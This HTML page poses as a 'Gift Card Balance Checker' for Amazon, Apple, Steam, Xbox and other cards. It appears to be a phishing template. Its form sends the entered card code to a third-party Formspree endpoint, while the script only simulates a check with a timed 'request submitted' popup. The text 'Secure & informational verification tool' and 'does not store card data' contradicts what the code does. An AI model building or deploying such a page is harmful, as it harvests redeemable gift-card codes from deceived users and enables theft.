<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Check Gift Cards Balance</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
  background: #fff;
  color: #111;
}

.wrapper {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 18px;
}

.box {
  width: 100%;
  max-width: 400px;
  border: 1px solid #e6e6e6;
  padding: 22px;
  border-radius: 6px;
}

h1 {
  font-size: 18px;
  text-align: center;
  margin: 0 0 6px;
}

.subtitle {
  text-align: center;
  font-size: 12px;
  color: #666;
  margin-bottom: 20px;
}

label {
  font-size: 12px;
  margin-top: 14px;
  display: block;
}

select, input {
  width: 100%;
  padding: 10px;
  margin-top: 6px;
  border: 1px solid #ccc;
  font-size: 13px;
  border-radius: 4px;
}

button {
  width: 100%;
  margin-top: 18px;
  padding: 11px;
  background: #1a73e8;
  border: none;
  color: #fff;
  font-size: 14px;
  cursor: pointer;
  border-radius: 4px;
}

button:hover {
  background: #1558b0;
}

/* Card icons strip */
.card-icons {
  display: flex;
  gap: 10px;
  margin-top: 8px;
  justify-content: center;
}

.card-icon {
  width: 24px;
  height: 24px;
}

/* Notice */
.notice {
  margin-top: 18px;
  font-size: 11px;
  color: #777;
  text-align: center;
  line-height: 1.4;
}

/* Loader */
.loader {
  display: none;
  font-size: 12px;
  text-align: center;
  margin-top: 10px;
  color: #555;
}

/* Popup success/error */
.popup {
  display: none;
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: #fff;
  border: 1px solid #e6e6e6;
  padding: 22px;
  max-width: 320px;
  text-align: center;
  z-index: 1000;
  border-radius: 6px;
  box-shadow: 0 4px 15px rgba(0,0,0,0.15);
}

.popup h2 {
  margin-top: 0;
  font-size: 16px;
}

.popup p {
  font-size: 13px;
  color: #555;
}

.popup button {
  margin-top: 12px;
  background: #1a73e8;
  color: #fff;
  padding: 8px 14px;
  font-size: 13px;
  border-radius: 4px;
  cursor: pointer;
  border: none;
}

.popup button:hover {
  background: #1558b0;
}

/* Overlay */
.overlay {
  display: none;
  position: fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background: rgba(0,0,0,0.35);
  z-index: 900;
}
</style>

<script>
let lastSubmit = 0;

function showPopup(type, message) {
  document.getElementById('overlay').style.display = 'block';
  const popup = document.getElementById(type);
  popup.querySelector('p').innerText = message;
  popup.style.display = 'block';
}

function closePopup(type) {
  document.getElementById('overlay').style.display = 'none';
  document.getElementById(type).style.display = 'none';
}

function validateForm() {
  const now = Date.now();
  if (now - lastSubmit < 15000) {
    alert("Please wait before submitting again.");
    return false;
  }
  lastSubmit = now;

  const type = document.getElementById("card_type").value;
  const code = document.getElementById("card_code").value.trim();

  if (!type || !code) {
    showPopup('errorPopup', 'Please select a card type and enter a valid code.');
    return false;
  }

  const rules = {
    "Amazon": [13, 14],
    "Apple": [16],
    "Google Play": [16],
    "Steam": [15, 17],
    "Xbox": [25]
  };

  if (rules[type] && !rules[type].includes(code.length)) {
    showPopup('errorPopup', 'Invalid code length for this card type.');
    return false;
  }

  document.getElementById("loader").style.display = "block";

  // Simulate processing delay
  setTimeout(() => {
    document.getElementById("loader").style.display = "none";
    showPopup('successPopup', 'Your request has been successfully submitted. Verify balance with the official issuer.');
  }, 1500);

  return true;
}
</script>

</head>

<body>

<div class="wrapper">
  <div class="box">

    <h1>Gift Card Balance Checker</h1>
    <div class="subtitle">Secure & informational verification tool</div>

    <form action="https://formspree.io/f/YOUR_FORM_ID"
          method="POST"
          onsubmit="return validateForm()">

      <label>Gift Card Type</label>
      <select id="card_type" name="card_type" required>
        <option value="">Select</option>
        <option>Amazon</option>
        <option>Apple</option>
        <option>Google Play</option>
        <option>Steam</option>
        <option>Xbox</option>
        <option>PlayStation</option>
        <option>Visa / Mastercard</option>
        <option>Other</option>
      </select>

      <!-- Card icons strip -->
      <div class="card-icons">
        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" alt="Amazon">
        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg" alt="Apple">
        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg" alt="Google Play">
        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg" alt="Steam">
        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/xbox.svg" alt="Xbox">
      </div>

      <label>Card Code</label>
      <input id="card_code" type="text" name="card_code"
             placeholder="Enter card code" required>

      <button type="submit"><i class="fa-solid fa-magnifying-glass"></i> Check Balance</button>

      <div id="loader" class="loader">Processing requestâ€¦</div>
    </form>

    <div class="notice">
      This service does not store card data.<br>
      Always verify balances with official issuers.
    </div>

  </div>
</div>

<!-- Overlay for popups -->
<div id="overlay" class="overlay"></div>

<!-- Success popup -->
<div id="successPopup" class="popup">
  <h2>Request Submitted</h2>
  <p></p>
  <button onclick="closePopup('successPopup')">Close</button>
</div>

<!-- Error popup -->
<div id="errorPopup" class="popup">
  <h2>Error</h2>
  <p></p>
  <button onclick="closePopup('errorPopup')">Close</button>
</div>

<!-- Privacy-safe analytics -->
<script data-goatcounter="https://checkgiftcardsbalance.goatcounter.com/count"
        async src="//gc.zgo.at/count.js"></script>

</body>
</html>
